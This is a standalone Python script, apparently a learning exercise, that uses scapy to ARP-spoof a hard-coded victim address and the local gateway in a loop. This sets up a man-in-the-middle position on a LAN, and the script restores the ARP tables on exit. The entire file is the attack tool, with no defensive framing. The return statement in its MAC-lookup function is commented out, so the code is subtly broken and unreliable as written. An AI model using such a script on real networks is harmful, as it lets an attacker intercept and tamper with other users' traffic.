#!/usr/bin/env python
import scapy.all as scapy
import time

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]

    #return answered_list[0][1].hwsrc

#Packet being sent to the victim
def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)

def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc = source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False) #We send this packet 4 times.


target_ip = "192.168.1.16"
gateway_ip = "192.168.1.1"


count = 0
try:
    while True:
        spoof(target_ip, gateway_ip)
        spoof(gateway_ip, target_ip)
        count = count + 2
        print("\rPackets Sent: " + str(count), end="")
        time.sleep(2)
except KeyboardInterrupt:
    print("\nProgram Terminated")
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)
    print("ARP Restored")
